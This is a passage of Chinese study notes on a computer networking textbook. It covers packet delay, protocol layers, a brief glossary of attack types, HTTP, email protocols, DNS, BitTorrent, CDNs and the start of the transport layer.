class="headerlink" title="2. 分组交换与电路交换的对比"></a>2. 分组交换与电路交换的对比</h4><h3 id="1-3-3-网络的网络"><a href="#1-3-3-网络的网络" class="headerlink" title="1.3.3 网络的网络"></a>1.3.3 网络的网络</h3><h2 id="1-4-分组交换网中的时延，丢包和吞吐量"><a href="#1-4-分组交换网中的时延，丢包和吞吐量" class="headerlink" title="1.4 分组交换网中的时延，丢包和吞吐量"></a>1.4 分组交换网中的时延，丢包和吞吐量</h2><p>吞吐量指每秒能够传送的数据量.</p><h3 id="1-4-1-分组交换网中的时延概述"><a href="#1-4-1-分组交换网中的时延概述" class="headerlink" title="1.4.1 分组交换网中的时延概述"></a>1.4.1 分组交换网中的时延概述</h3><p>最为重要的时延如节点处理时延 (nodal processing delay), 排队时延 (queuing delay), 传输时延 (transmission delay) 和传播时延 (propagation delay)，这些时延总体累加起来是节点总时延 (total nodal delay).</p><h4 id="时延类型"><a href="#时延类型" class="headerlink" title="时延类型"></a>时延类型</h4><h5 id="传输时延和传播时延的比较"><a href="#传输时延和传播时延的比较" class="headerlink" title="传输时延和传播时延的比较"></a>传输时延和传播时延的比较</h5><p>传输时延 (transmission delay) 指将分组送上链路所用的时间.</p><p>传播时延 (propagation delay) 指将分组从源路由器发送到目标的时间.</p><h3 id="1-4-2-排队时延和丢包"><a href="#1-4-2-排队时延和丢包" class="headerlink" title="1.4.2 排队时延和丢包"></a>1.4.2 排队时延和丢包</h3><p>排队时延对不同的分组可能是不同的.</p><p>若 <code>a</code> 表示分组到达队列的瓶蕨速率，(a 的单位是分组&#x2F;秒，即 pkt&#x2F;s).</p><p><code>R</code> 是传输速率，即从队列中推出比特的速率 (以 bps，即 b&#x2F;s 为单位).</p><p>同时假定所有分组都是由 L 比特组成. 则比特到达队列的平均速率是 La bps.</p><p>比率 <code>La/R</code> 被称为 <mark>流量强度 (traddic intensity)</mark> </p><p>设计系统时流量强度不能大于 1.</p><p>通常，到达队列的过程是随机的.</p><h4 id="丢包"><a href="#丢包" class="headerlink" title="丢包"></a>丢包</h4><h3 id="1-4-3-端到端时延"><a href="#1-4-3-端到端时延" class="headerlink" title="1.4.3 端到端时延"></a>1.4.3 端到端时延</h3><h3 id="1-4-4-计算机网络中的吞吐量"><a href="#1-4-4-计算机网络中的吞吐量" class="headerlink" title="1.4.4 计算机网络中的吞吐量"></a>1.4.4 计算机网络中的吞吐量</h3><h2 id="1-5-协议层次及其服务模型"><a href="#1-5-协议层次及其服务模型" class="headerlink" title="1.5 协议层次及其服务模型"></a>1.5 协议层次及其服务模型</h2><h3 id="1-协议分层"><a href="#1-协议分层" class="headerlink" title="1. 协议分层"></a>1. 协议分层</h3><p>一个协议层能够用软件，硬件或两者的结合来实现.</p><p>网络层经常是硬件和软件实现的混合体.</p><p>分层提供了一种结构化方式来讨论系统组件.</p><p>模块化使更新系统组件更为容易.</p><p>分层的一个潜在缺点是一层可能冗余较低层的功能.</p><p>各层的所有协议被称为协议栈 (protocol stack), 因特网的协议栈由 5 个层次组成:</p><ul><li>物理层</li><li>链路层</li><li>网络层</li><li>运输层</li><li>应用层</li></ul><p><img src="/../img/tcp_and_osi.png"></p><h4 id="1-应用层"><a href="#1-应用层" class="headerlink" title="(1) 应用层"></a>(1) 应用层</h4><p>位于应用层的信息分组称为报文 (message).</p><h4 id="2-传输层"><a href="#2-传输层" class="headerlink" title="(2) 传输层"></a>(2) 传输层</h4><p>因特网的运输层在应用程序端点之间传送应用层报文.</p><p>运输层的分组称为报文段 (segment).</p><h4 id="3-网络层"><a href="#3-网络层" class="headerlink" title="(3) 网络层"></a>(3) 网络层</h4><p>因特网的网络层负责将称为数据报 (datagram) 的网络层分组从一台主机移动到另一台主机.</p><h4 id="4-链路层"><a href="#4-链路层" class="headerlink" title="(4) 链路层"></a>(4) 链路层</h4><p>链路层的分组称为帧 (frame).</p><p>其将整个帧从一个网络元素移动到邻近的网络元素。</p><h4 id="5-物理层"><a href="#5-物理层" class="headerlink" title="(5) 物理层"></a>(5) 物理层</h4><p>将帧中的一个个比特从一个节点移动到下一个节点.</p><h3 id="2-OSI-模型"><a href="#2-OSI-模型" class="headerlink" title="2. OSI 模型"></a>2. OSI 模型</h3><p>表示层的作用是使通信的应用程序能够解释交换数据的含义.</p><p>会话层提供了数据交换的定界和同步功能.</p><h3 id="1-5-2-封装"><a href="#1-5-2-封装" class="headerlink" title="1.5.2 封装"></a>1.5.2 封装</h3><p>链路交换机实现了第一层和第二层.</p><p>路由器实现了第一层到第三层.</p><p>应用层报文和运输层首部信息一道构成了运输层报文段 (transport-layer segment).</p><p>在每一层，一个分组具有两种类型的字段: 首部字段和有效载荷字段 (payload field). 有效载荷通常是来自上一层的分组.<br><img src="/../img/encapsulation.png"></p><h2 id="1-6-面对攻击的网络"><a href="#1-6-面对攻击的网络" class="headerlink" title="1.6 面对攻击的网络"></a>1.6 面对攻击的网络</h2><p>多数恶意软件 (malware) 是自我复制的.</p><p>病毒 (virus) 是一种需要某种形式的用户交互来感染用户设备的恶意软件.</p><p>蠕虫 (worm) 是一种无须任何明显用户交互就能进入设备的恶意软件.</p><p>拒绝服务攻击 (Denial-of-Service, DoS, attack). 其使得网络，主机或其他基础设施部分不能由合法用户使用.</p><p>大多数 DoS 属于:</p><ul><li>弱点攻击</li><li>带宽攻击</li><li>连接洪泛</li></ul><p>DDoS (Distributed DoS, 分布式 DoS)<br><img src="/../img/DDoS.png"></p><h3 id="嗅探分组"><a href="#嗅探分组" class="headerlink" title="嗅探分组"></a>嗅探分组</h3><p>记录每个流经的分组副本的被动接收机被称为分组嗅探器 (packet sniffer).</p><h3 id="伪装"><a href="#伪装" class="headerlink" title="伪装"></a>伪装</h3><p>将具有虚假源地址的分组注入因特网的能力被称为 IP 哄骗 (IP spoofing).</p><h1 id="第二章-应用层"><a href="#第二章-应用层" class="headerlink" title="第二章 应用层"></a>第二章 应用层</h1><h2 id="2-1-应用层协议原理"><a href="#2-1-应用层协议原理" class="headerlink" title="2.1 应用层协议原理"></a>2.1 应用层协议原理</h2><p>两种主流体系结构之一: 客户-服务器体系结构 或对等 (P2P) 体系结构.</p><p>客户-服务器体系结构 (client-server architecture), 有一个总是打开的主机称为服务器，它服务于来自许多其他称为客户的主机的请求. 客户之间不直接通信.</p><p>P2P 体系结构 (P2P architecture), 对位于数据中心的专用服务器有最小的依赖. 应用程序在主机间直接通信，这些主机称为对等方.</p><p>有些应用具有混合的体系结构.</p><h3 id="2-1-2-进程通信"><a href="#2-1-2-进程通信" class="headerlink" title="2.1.2 进程通信"></a>2.1.2 进程通信</h3><p>在两个不同端系统上的进程，通过跨越计算机网络交换报文 (message) 而相互通信.</p><h4 id="1-客户和服务器进程"><a href="#1-客户和服务器进程" class="headerlink" title="1. 客户和服务器进程"></a>1. 客户和服务器进程</h4><p>对每对通信进程, 我们通常将这两个进程之一标识为客户 (client), 而另一个进程标识为服务器 (server).</p><p>在 P2P 文件共享的某些应用中，一个进程即是客户又是服务器.</p><p>我们定义客户和服务器进程如下:</p><blockquote><p>在一对进程之间的通信会话场景中, 发起通信的进程被标识为客户，在会话开始时等待联系的进程是服务器.</p></blockquote><h4 id="2-进程与计算机网络之间的接口"><a href="#2-进程与计算机网络之间的接口" class="headerlink" title="2. 进程与计算机网络之间的接口"></a>2. 进程与计算机网络之间的接口</h4><p>进程通过一个称为套接字 (socket) 的软件接口向网络发送报文和从网络接收报文.</p><p>套接字是应用层与传输层之间的接口.</p><p>由于该套接字是建立网络应用程序的可编程接口, 因此套接字也称为应用程序和网络之间的应用程序接口 (Application Programming Interface, API).</p><p>应用程序开发者可以控制套接字在应用层端的一切，但是对该套接字的运输层端几乎没有控制权.</p><h4 id="3-进程寻址"><a href="#3-进程寻址" class="headerlink" title="3. 进程寻址"></a>3. 进程寻址</h4><p>需定义两种信息:</p><ul><li>主机的地址, 由 IP 地址标识</li><li>在目的主机中指定接收进程的标识符, 由目的端口号标识</li></ul><p>所有因特网标准协议的周知端口号的列表能够在 <a href="http://www.iana.org/">这个网址</a> 找到.</p><h3 id="2-1-3-可供应用程序使用的运输服务"><a href="#2-1-3-可供应用程序使用的运输服务" class="headerlink" title="2.1.3 可供应用程序使用的运输服务"></a>2.1.3 可供应用程序使用的运输服务</h3><h4 id="1-可靠数据传输-reliable-data-transfer"><a href="#1-可靠数据传输-reliable-data-transfer" class="headerlink" title="1. 可靠数据传输 (reliable data transfer)"></a>1. 可靠数据传输 (reliable data transfer)</h4><h4 id="2-吞吐量"><a href="#2-吞吐量" class="headerlink" title="2. 吞吐量"></a>2. 吞吐量</h4><p>具有吞吐量要求的应用程序被称为带宽敏感的应用 (bandwidth-sensitive application), 其具有特定的吞吐量要求.</p><p>弹性应用 (elastic application), 能够根据当时可用的宽带或多或少地利用可供使用的吞吐量.</p><h4 id="3-定时"><a href="#3-定时" class="headerlink" title="3. 定时"></a>3. 定时</h4><h4 id="4-安全性"><a href="#4-安全性" class="headerlink" title="4. 安全性"></a>4. 安全性</h4><h3 id="2-1-4-因特网提供的运输服务"><a href="#2-1-4-因特网提供的运输服务" class="headerlink" title="2.1.4 因特网提供的运输服务"></a>2.1.4 因特网提供的运输服务</h3><p>提供了 TCP 和 UDP.</p><h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><p>面向连接服务和可靠数据传输服务.</p><p>TCP 连接是全双工的.</p><p>具有拥塞控制机制.</p><p><mark>无论是 TCP 还是 UDP 都没有提供任何加密机制</mark> </p><p>SSL (Secure Sockets Layer) 是 TCP 的加强版本, 但这种加强是在应用层上.</p><p>SSL 加密数据并将加密的数据传递给 TCP 套接字.</p><h4 id="2-UDP-服务"><a href="#2-UDP-服务" class="headerlink" title="2. UDP 服务"></a>2. UDP 服务</h4><p>一种不提供不必要服务的轻量级运输协议.</p><p>无连接，不可靠的数据传输服务.</p><p>UDP 没有包括拥塞控制机制，UDP 的发送端可以用它选定的任何速率向其下层 (网络层) 注入数据.</p><h4 id="3-因特网运输协议所不提供的服务"><a href="#3-因特网运输协议所不提供的服务" class="headerlink" title="3. 因特网运输协议所不提供的服务"></a>3. 因特网运输协议所不提供的服务</h4><p>TCP 和 UDP 并未提供对吞吐量和定时保证的服务.</p><p>许多防火墙被配制成阻挡 (大多数类型的) UDP 流量，所以因特网电话应用通常设计成如果 UDP 通信失败就使用 TCP 作为备份.</p><h3 id="2-1-5-应用层协议"><a href="#2-1-5-应用层协议" class="headerlink" title="2.1.5 应用层协议"></a>2.1.5 应用层协议</h3><p>应用层协议 (application-layer protocol) 定义了运行在不同端系统上的应用程序进程如何相互传递报文.</p><p>应用层协议定义了:</p><ul><li>交换的报文类型</li><li>各种报文类型的语法</li><li>字段的语义</li><li>确定一个进程何时以及如何发送报文</li></ul><p>区分网络应用和应用层协议.</p><h2 id="2-2-Web-和-HTTP"><a href="#2-2-Web-和-HTTP" class="headerlink" title="2.2 Web 和 HTTP"></a>2.2 Web 和 HTTP</h2><h3 id="2-2-1-HTTP-概况"><a href="#2-2-1-HTTP-概况" class="headerlink" title="2.2.1 HTTP 概况"></a>2.2.1 HTTP 概况</h3><p>HTTP 由两个程序实现:</p><ul><li>客户程序</li><li>服务器程序</li></ul><p>多数 Web 页面包含一个 HTML 基本文件 (base HTML file) 以及几个引用对象.</p><p>HTML 基本文件通过对象的 URL 地址引用页面中的其他对象. </p><p>HTTP 定义了 Web 客户向 Web 服务器请求 Web 页面的方式, 以及服务器向客户传送 Web 页面的方式.</p><p>客户向它的套接字接口发送 HTTP 请求报文并从它的套接字接口接收 HTTP 响应报文.</p><p>服务器向客户发送被请求的文件，而不存储任何关于改客户的状态信息.</p><p>HTTP 是一个无状态协议 (stateless protocol).</p><h3 id="2-2-2-非持续连接和持续连接-non-persistent-connection-and-persistent-connection"><a href="#2-2-2-非持续连接和持续连接-non-persistent-connection-and-persistent-connection" class="headerlink" title="2.2.2 非持续连接和持续连接 (non-persistent connection and persistent connection)"></a>2.2.2 非持续连接和持续连接 (non-persistent connection and persistent connection)</h3><p>HTTP 既能够使用非持续连接，也能够使用持续连接。</p><p>HTTP 默认使用持续连接.</p><p>浏览器实现了 Web 客户端.</p><p>Web 服务器存储文件.</p><p>TCP 为 HTTP 提供可靠的传输服务.</p><p>HTTP 服务器并不保存关于客户的任何信息, 所以说 HTTP 是一个无状态协议 (stateless protocal).</p><p>非持续性连接 (non-persistent connection) 是指每个请求&#x2F;响应对是经一个单独的 TCP 连接发送的.</p><p>持续连接 (persistent connection) 是指所有请求&#x2F;响应对是经相同的 TCP 连接发送的.</p><p>HTTP 在其默认的方式下使用持续连接.</p><p>HTTP 的默认端口是 80.</p><p>两个不同的浏览器也许会以不同的方式解释同一个页面.</p><p>HTTP 与客户程序如何解释一个 Web 页面毫无关系.</p><p>HTTP 规范仅定义了在 HTTP 客户程序与 HTTP 服务器进程之间的通信协议.</p><h4 id="1-非持续性连接"><a href="#1-非持续性连接" class="headerlink" title="1. 非持续性连接"></a>1. 非持续性连接</h4><p>缺点, 负担大.</p><p>每个 TCP 连接只传输一个请求报文和一个响应报文.</p><p>使用并行连接可以缩短响应时间.</p><p>往返时间 (Round-Trip Time, RTT) 指一个短分组从客户到服务器然后再返回客户所花费的时间.</p><p>三次握手大概:</p><ol><li>Client: 我发给你了</li><li>Server: 我返回了</li><li>Client: 我收到了</li></ol><h4 id="2-持续性连接"><a href="#2-持续性连接" class="headerlink" title="2. 持续性连接"></a>2. 持续性连接</h4><p>一般来说, 如果一条连接经过一定时间间隔仍未被使用, HTTP 服务器就关闭该连接.</p><h3 id="2-2-3-HTTP-报文格式"><a href="#2-2-3-HTTP-报文格式" class="headerlink" title="2.2.3 HTTP 报文格式"></a>2.2.3 HTTP 报文格式</h3><h4 id="1-HTTP-请求报文"><a href="#1-HTTP-请求报文" class="headerlink" title="1. HTTP 请求报文"></a>1. HTTP 请求报文</h4><p>如:<br><img src="/../img/sample_http_message.png"></p><p>通用格式:</p><p><img src="/../img/common_structure_of_http_message.png"></p><p>使用 GET 方法时实体体为空，而使用 POST 方法是才使用.</p><h4 id="2-HTTP-响应报文"><a href="#2-HTTP-响应报文" class="headerlink" title="2. HTTP 响应报文"></a>2. HTTP 响应报文</h4><p>如:<br><img src="/../img/sample_of_replay_message.png"></p><p>通用格式：</p><p><img src="/../img/common_reply_structure.png"></p><p>常见的状态吗和相关的短语:</p><p><img src="/../img/common_state_num.png"></p><h3 id="2-2-4-用户与服务器的交互-cookie"><a href="#2-2-4-用户与服务器的交互-cookie" class="headerlink" title="2.2.4 用户与服务器的交互: cookie"></a>2.2.4 用户与服务器的交互: cookie</h3><p>HTTP 是无状态的但是 cookie 允许站点对用于进行追踪.</p><p>cookie 技术有 4 个组件:</p><ol><li>HTTP 响应报文中的一个 cookie 首部行</li><li>在 HTTP 请求报文中的一个 cookie 首部行</li><li>在客户端系统中保存有一个 cookie 文件，并有用户的浏览器进行管理</li><li>位于 Web 站点的一个后端数据库</li></ol><p>具体流程:</p><p><img src="/../img/cookie_work_flow.png"></p><p>cookie 可以用于标识一个用户。用户首次访问一个站点时，可能需要提供一个用户标识.</p><h3 id="2-2-5-Web-缓存"><a href="#2-2-5-Web-缓存" class="headerlink" title="2.2.5 Web 缓存"></a>2.2.5 Web 缓存</h3><p>Web 缓存器 (Web cache) 也叫代理服务器 (proxy server)</p><p>Web 缓存器有自己的磁盘存储空间，并在存储空间中保存最近请求过的对象副本.</p><p><img src="/../img/web_cache_working_flow.png"></p><p>Web 缓存器既是服务器又是客户.</p><p>其中一个步骤: 如果 Web 缓存器中没有该对象，它就打开一个与该对象的初始服务器的 TCP 连接，Web 缓存器到服务器的 TCP 连接上发送一个与该对象的 HTTP 请求，在受到请求后，初始服务器向该 Web 服务器发送具有该对象的 HTTP 响应.</p><p>请求从 Web 缓存器上响应，可以降低流向代理服务器的请求，减小流量强度.</p><h3 id="2-2-6-条件-GET-方法"><a href="#2-2-6-条件-GET-方法" class="headerlink" title="2.2.6 条件 GET 方法"></a>2.2.6 条件 GET 方法</h3><p>包含 <code>if-Modified-Since:</code> 首部行.</p><p>由缓存器发出.</p><p>其告诉服务器，仅当自指定日期之后该对象被修改过，才发送该对象.</p><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p>位于 TCP&#x2F;IP 参考模型的应用层.</p><h2 id="2-3-因特网中的电子邮件"><a href="#2-3-因特网中的电子邮件" class="headerlink" title="2.3 因特网中的电子邮件"></a>2.3 因特网中的电子邮件</h2><p>因特网电子邮件系统有三个主要组成部分:</p><ul><li>用户代理 (user agent), 如 Outlook</li><li>邮件服务器 (mail server) </li><li>简单邮件传输 (Simple Mail Transfer Protocol, SMTP)</li></ul><p>用户代理允许用户阅读, 回复, 转发, 保存和撰写报文.</p><p>邮箱位于邮件服务器中.<br><img src="/../img/mail_structure.png"><br>SMTP 用 TCP 传输.</p><p>SMTP 包含两部分:</p><ul><li>运行在发送方邮件服务器的客户端</li><li>运行在接收方邮件服务器的服务端</li></ul><h3 id="2-3-1-SMTP"><a href="#2-3-1-SMTP" class="headerlink" title="2.3.1 SMTP"></a>2.3.1 SMTP</h3><p>其限制所有邮件报文的体部分只能采用简单的 7 比特 ASCII 表示.</p><p>在使用 SMTP 传送邮件之前, 需要将二进制多媒体数据编码为 ASCII 码, 并且在使用 SMTP 传输后要求将相应的 ASCII 码邮件解码还原为多媒体数据.</p><p>使用 HTTP 传送前不需要将多媒体数据编码为 ASCII 码.</p><p>过程:<br><img src="/../img/transfer_mail_SMTP.png"></p><p>SMTP 一般不使用中间邮件服务器发送邮件.</p><p>如果 Bob 的邮件服务器没有开机, 该报文会保留在 Alice 的邮件服务器上并等待进行新的尝试.</p><p>SMTP 是持续连接的: 如果发送邮件服务器有几个报文发往同一个接受邮件服务器, 它可以通过同一个 TCP 连接发送这些所有的报文.</p><h3 id="2-3-2-与-HTTP-的对比"><a href="#2-3-2-与-HTTP-的对比" class="headerlink" title="2.3.2 与 HTTP 的对比"></a>2.3.2 与 HTTP 的对比</h3><p>HTTP 把每个对象封装到它自己的 HTTP 响应报文中, 而 SMTP 则把所有报文对象放在一个报文之中.</p><h3 id="2-3-3-邮件报文格式"><a href="#2-3-3-邮件报文格式" class="headerlink" title="2.3.3 邮件报文格式"></a>2.3.3 邮件报文格式</h3><p>每个首部必须含有一个 <code>From: </code> 首部行和一个 <code>To: </code> 首部行. 可能包含一个 <code>Subject: </code> 首部行或其他可选行.</p><p>如:</p><p><img src="/../img/header_of_mail.png"></p><h3 id="2-3-4-邮件访问协议"><a href="#2-3-4-邮件访问协议" class="headerlink" title="2.3.4 邮件访问协议"></a>2.3.4 邮件访问协议</h3><p>SMTP 协议是一个推协议，不能用其得到报文.</p><p>使用第三版邮局协议 (Post Office Protocol – Version 3, POP3), 因特网邮件访问协议 (Internet Mail Access Protocol, IMAP), 以及 HTTP.</p><p><img src="/../img/send_and_get_mail.png"></p><h4 id="1-POP3"><a href="#1-POP3" class="headerlink" title="1. POP3"></a>1. POP3</h4><p>POP3 协议没有给用户提供任何创建远程文件夹并为报文指派文件夹的方法.</p><h4 id="2-IMAP"><a href="#2-IMAP" class="headerlink" title="2. IMAP"></a>2. IMAP</h4><p>IMAP 服务器把每个报文与一个文件夹联系起来，当报文第一次到达服务器时，它与收件人的 INBOX 文件夹相关联。</p><p>IMAP 提供了在远程文件夹中查询邮件的命令.</p><h4 id="3-基于-Web-的电子邮件"><a href="#3-基于-Web-的电子邮件" class="headerlink" title="3. 基于 Web 的电子邮件"></a>3. 基于 Web 的电子邮件</h4><p>用户代理为普通的浏览器. 使用 HTTP 协议.</p><h2 id="2-4-DNS-因特网的目录服务"><a href="#2-4-DNS-因特网的目录服务" class="headerlink" title="2.4 DNS: 因特网的目录服务"></a>2.4 DNS: 因特网的目录服务</h2><h3 id="2-4-1-DNS-Domain-Name-System-提供的服务"><a href="#2-4-1-DNS-Domain-Name-System-提供的服务" class="headerlink" title="2.4.1 DNS (Domain Name System) 提供的服务"></a>2.4.1 DNS (Domain Name System) 提供的服务</h3><p>识别主机有两种方式:</p><ul><li>主机名 (便于人记忆)</li><li>IP 地址 (便于路由器处理)</li></ul><p>DNS 服务器通常是运行 BIND (Berkeley Internet Name Domain) 软件的 UNIX 机器.</p><p>DNS 协议运行在 UDP 之上, 使用 53 号端口.</p><p>DNS 协议是应用层协议, 通常由其他应用曾协议所使用, 包括 HTTP, SMTP 和 FTP, 将用户提供的主机名解析为 IP 地址.</p><p>DNS 协议也使用客户-服务器模式运行在通信的端系统之间.</p><p>除了进行主机名到 IP 地址的转换外, DNS 还提供了一些重要的服务:</p><ul><li>主机别名 (host aliasing)</li><li>邮件服务器别名 (mail server aliasing)</li><li>负载分配 (load distribution)</li></ul><h3 id="2-4-2-DNS-工作机理概述"><a href="#2-4-2-DNS-工作机理概述" class="headerlink" title="2.4.2 DNS 工作机理概述"></a>2.4.2 DNS 工作机理概述</h3><h4 id="1-分布式，层次数据库"><a href="#1-分布式，层次数据库" class="headerlink" title="1. 分布式，层次数据库"></a>1. 分布式，层次数据库</h4><p>大致有三种类型的 DNS 服务器:</p><ul><li>根 DNS 服务器</li><li>顶级域 (Top-Level Domain, TLD) DNS 服务器</li><li>权威 DNS 服务器</li></ul><p>如:<br><img src="/../img/DNS_root_layer.png"></p><p>还有本地 DNS 服务器 (local DNS server). 每个 ISP 都有一台本地 DNS 服务器.</p><p>当主机发出 DNS 请求时，该请求被发往本地 DNS 服务器, 它起着代理的作用，并将该请求转发到 DNS 服务器层次结构中:</p><p>如:<br><img src="/../img/redirect_DNS_requese.png"></p><p>查询似乎是从后缀开始的，如 <code>apricot.nyu.edu</code> 先找到 <code>.edu</code> 然后是 <code>nyu.edu</code>, 最后才查到 <code>apricot.nyu.edu</code></p><h4 id="2-DNS-缓存-DNS-caching"><a href="#2-DNS-缓存-DNS-caching" class="headerlink" title="2. DNS 缓存 (DNS caching)"></a>2. DNS 缓存 (DNS caching)</h4><p>本地 DNS 服务器存储从其他 DNS 服务器获取的映射关系.</p><p>由于主机名与 IP 地址间的映射并不是永久的，DNS 服务器在一段时间后 (通常设置为两天) 将丢弃缓存的信息.</p><h3 id="2-4-3-DNS-记录和报文"><a href="#2-4-3-DNS-记录和报文" class="headerlink" title="2.4.3 DNS 记录和报文"></a>2.4.3 DNS 记录和报文</h3><p>资源记录 (Resource Record, RR).</p><p>RR 提供了主机名到 IP 地址的映射.</p><p>资源记录是包含了下列字段的 4 元组:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">(<span class="hljs-keyword">Name</span>, Value, <span class="hljs-keyword">Type</span>, TTL)<br></code></pre></td></tr></table></figure><p>含义具体看书。</p><p>类型为 A 的资源记录提供了标准的主机名到 IP 地址的映射.</p><p>类型为 NS 的记录用于沿着查询链来路由 DNS 查询. 包含主机名的域.</p><p>CNAME 类型的记录表明是别名. MX 也是别名，但有一些使用上的区别: 为了获取邮件服务器的规范主机名，DNS 客户应当请求一条 MX 记录; 而为了获取其他服务的规范主机名，DNS 客户应当请求 CNAME 记录.</p><h4 id="1-DNS-报文"><a href="#1-DNS-报文" class="headerlink" title="1. DNS 报文"></a>1. DNS 报文</h4><p>DNS 有查询和回答报文，有相同的格式:</p><p><img src="/../img/DNS_message.png"></p><p>具体解析见书.</p><p>使用 <code>nslookup</code> 命令可以向任何 DNS 服务器发送 DNS 查询.</p><h4 id="2-在-DNS-数据库中插入记录"><a href="#2-在-DNS-数据库中插入记录" class="headerlink" title="2. 在 DNS 数据库中插入记录"></a>2. 在 DNS 数据库中插入记录</h4><p>注册登记机构 (registrar) 是一个商业实体，它验证该域名的唯一性，将该域名输入 DNS 数据库，对提供的服务收取少量费用.</p><p>因特网名字和地址分配机构 (Internet Corporation for Assigned Names and Numbers, ICANN) 向各种注册登记机构授权.</p><h2 id="2-5-P2P-Peer-To-Peer-文件分发"><a href="#2-5-P2P-Peer-To-Peer-文件分发" class="headerlink" title="2.5 P2P (Peer To Peer) 文件分发"></a>2.5 P2P (Peer To Peer) 文件分发</h2><p>到 2016 年止，最为流行的 P2P 文件分发协议是 BitTorrent.</p><h3 id="1-P2P-体系结构的扩展性"><a href="#1-P2P-体系结构的扩展性" class="headerlink" title="1. P2P 体系结构的扩展性"></a>1. P2P 体系结构的扩展性</h3><h3 id="2-BitTorrent"><a href="#2-BitTorrent" class="headerlink" title="2. BitTorrent"></a>2. BitTorrent</h3><p>用 BitTorrent 的术语来讲, 参与一个特定文件分发的所有对等方的集合被称为一个洪流 (torrent).</p><p>在一个洪流中的对等方彼此下载等长度的文件块 (chunk).</p><p>每个洪流具有一个基础设施节点，称为追踪器 (tracker). 当一个对等方加入某洪流时，它向追踪器注册自己，并周期性地通知追踪器它仍在该洪流中.</p><p>与列表上所有对等方创建并行的 TCP 连接.</p><p>如:<br><img src="/../img/tracker_bittorrent.png"></p><p>在任何给定的时刻，Alice 将具有块的子集并知道它的邻居具有哪些块.</p><p>稀缺优先技术 (rarest first).</p><h2 id="2-6-视频流和内容分发网"><a href="#2-6-视频流和内容分发网" class="headerlink" title="2.6 视频流和内容分发网"></a>2.6 视频流和内容分发网</h2><h3 id="2-6-1-因特网视频"><a href="#2-6-1-因特网视频" class="headerlink" title="2.6.1 因特网视频"></a>2.6.1 因特网视频</h3><p>在流式存储视频应用中，基础的媒体是预先录制的视频.</p><p>视频是一系列图像，通常以一种恒定的速率来展示。</p><p>一副未压缩，数字编码的图像由像素阵列组成，其中每个像素是由一些比特编码来表示亮度和颜色.</p><h3 id="2-6-2-HTTP-流和-DASH"><a href="#2-6-2-HTTP-流和-DASH" class="headerlink" title="2.6.2 HTTP 流和 DASH"></a>2.6.2 HTTP 流和 DASH</h3><p>在 HTTP 流中，视频只是存储在 HTTP 服务器中作为一个普通文件.</p><p>新型的基于 HTTP 的流，经 HTTP 的动态适应性流 (Dynamic Adaptive Streaming over HTTP, DASH). 在其中，视屏编码为几个不同的版本，其中每个版本具有不同的比特率.</p><p>使用 DASH 后，每个视频版本存储在 HTTP 服务器中，每个版本都有一个不同的 URL.</p><h3 id="2-6-3-内容分发网"><a href="#2-6-3-内容分发网" class="headerlink" title="2.6.3 内容分发网"></a>2.6.3 内容分发网</h3><p>为了应对向分布于全世界的用户分发巨量视频数据的挑战，几乎所有主要的视频流公司都利用内容分发网 (Content Distribution Network, CDN).</p><p>CDN 管理分布在多个地理位置上的服务器。</p><h4 id="1-CDN-操作"><a href="#1-CDN-操作" class="headerlink" title="1. CDN 操作"></a>1. CDN 操作</h4><p>大多数 CDN 利用 DNS 来截获和重定向请求.</p><p><img src="/../img/CDN_using_DNS_redirection.png"></p><h4 id="2-集群选择策略"><a href="#2-集群选择策略" class="headerlink" title="2. 集群选择策略"></a>2. 集群选择策略</h4><p>集群选择策略 (cluster selection strategy), 即动态地将客户定向到 CDN 中的某个服务器集群或数据中心. </p><p>为了基于当前流量条件为客户决定最好的集群，CDN 能够对其集群和客户之间的时延和丢包性能执行周期性的实时测量。</p><h3 id="学习案例-Netflix-YouTube-和-“看看”"><a href="#学习案例-Netflix-YouTube-和-“看看”" class="headerlink" title="学习案例: Netflix, YouTube 和 “看看”"></a>学习案例: Netflix, YouTube 和 “看看”</h3><h4 id="1-Netflix"><a href="#1-Netflix" class="headerlink" title="1. Netflix"></a>1. Netflix</h4><p><img src="/../img/Netflix_CDN_strategy.png"></p><p>Netflix 不需要用 DNS 重定向来将特殊的客户连接到一台 CDN 服务器，而是直接告知该客户使用一台特定的 CDN 服务器.</p><h4 id="2-YouTube"><a href="#2-YouTube" class="headerlink" title="2. YouTube"></a>2. YouTube</h4><h2 id="2-7-套接字编程-生成网络应用"><a href="#2-7-套接字编程-生成网络应用" class="headerlink" title="2.7 套接字编程: 生成网络应用"></a>2.7 套接字编程: 生成网络应用</h2><p>有两类:</p><ul><li>有标准协议中定义的操作的实现, 公开</li><li>单独的开发团队研发，未公开</li></ul><p>在研发阶段，必须决定应用程序是运行在 TCP 上还是运行在 UDP 上.</p><p>应用程序需要注意避免使用周知的端口号.</p><h3 id="2-7-1-UDP-套接字编程"><a href="#2-7-1-UDP-套接字编程" class="headerlink" title="2.7.1 UDP 套接字编程"></a>2.7.1 UDP 套接字编程</h3><p>当生成一个套接字时，就为它分配一个称为端口号 (port number) 的标识符.</p><p>将源地址附在分组之上通常并不是由 UDP 应用程序代码所为，而是由底层操作系统自动完成.</p><p>使用 <code>encode()</code> 方法将报文由字符串类型转换为字节类型.</p><h1 id="第三章-运输层"><a href="#第三章-运输层" class="headerlink" title="第三章 运输层"></a>第三章 运输层</h1><h2 id="3-1-概述和运输层服务"><a href="#3-1-概述和运输层服务" class="headerlink" title="3.1 概述和运输层服务"></a>3.1 概述和运输层服务</h2><p>运输层协议为运行在不同主机上的应用进程之间提供了逻辑通信 (logic communication) 功能。所谓逻辑通信，就是相距很远的主机就好像直接相连.</p><p>运输层协议是在端系统中而不是在路由器中实现的.</p><p>网络路由器仅作用于该数据报的网络层字段，即他们不检查封装在该数据报的运输层报文段的字段.</p><h3 id="3-1-1-运输层和网络层的关系"><a href="#3-1-1-运输层和网络层的关系" class="headerlink" title="3.1.1 运输层和网络层的关系"></a>3.1.1 运输层和网络层的关系</h3><p>网络层提供了 <mark>主机</mark> 之间的逻辑通信.</p><p>运输层提供了运行在不同主机上的 <mark>进程</mark> 之间的逻辑通信.</p><p>运输协议能够提供的服务长长受限于底层网络层协议的服务模型.</p><h3 id="3-1-2-因特网运输层概述"><a href="#3-1-2-因特网运输层概述" class="headerlink" title="3.1.2 因特网运输层概述"></a>3.1.2 因特网运输层概述</h3><p>应用程序开发人员在生成套接字时必须指定是选择 UDP 